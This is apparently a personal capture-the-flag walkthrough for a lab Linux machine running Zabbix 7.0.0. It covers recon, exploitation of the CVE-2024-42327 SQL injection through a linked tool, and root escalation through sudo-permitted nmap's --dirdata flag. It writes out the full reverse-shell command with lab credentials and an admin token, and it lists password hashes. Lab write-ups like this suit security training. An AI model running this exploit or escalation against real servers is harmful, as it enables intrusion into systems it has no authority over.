# Machine Info
- **OS**  Linux
- **IP** 10.10.11.50
- **Credentials Given**  Account on Zabbix matthew:96qzn0h2e1k3
- **TAGS** #CVE #SQLI #Apache #RCE #WEB #GTFObins #ReverseShell 
--- 

# Collected Info

## Hashes 
- Admin : $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a
- guest : $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
	- matthew : $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS


# Recon
- **PORTS** : 
	- 22   OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
	- 80   Apache 2.4.52 (Ubuntu)

## PORT 80 Enumeration
- **URL** : http://10.10.11.50/zabbix/
- **Zabbix Version** : 7.0.0
- **VulnerAbility** : [Checking If Vulnerable To CVE-2024-42327](https://www.exploit-db.com/exploits/52230)

# Exploitation
- [Tool To Exploit CVE-2024-42327](https://github.com/874anthony/CVE-2024-42327_Zabbix_SQLi)
- Got an **Reverse Shell Using This Command From the Installed Tool : 

```bash
python3 sqliZabbix.py -u http://10.10.11.50/zabbix/ -U matthew -p 96qzn0h2e1k3 --ip 10.10.11.50 --port 1234 --admin_token d432bc4d6b02ef49b4f1a7061a5c3539 --mode rce
```

# Post Exploitation
- **Whoami**  zabbix
- **Users**  matthew
## User.txt
- We can get the `user.txt` with with *zabbix* user
- `cat /home/matthew/user.txt`
## Root.txt
- if we do `sudo -l` with the current user, we can notice that we can run **Nmap** with sudo privileges
- > But the Victim knew of The Security issues that run with giving sudo privs to nmap so he : 
	- **Disabled The Script mode**
	- **Disabled The Interactive Mode** 
- We can See saw by `cat /usr/bin/nmap`
- But There is an alternative way by using the **`--dirdata`** flag  like in [[GTFOBins]]


# PDF WalkThrough

![[Unrested.pdf]]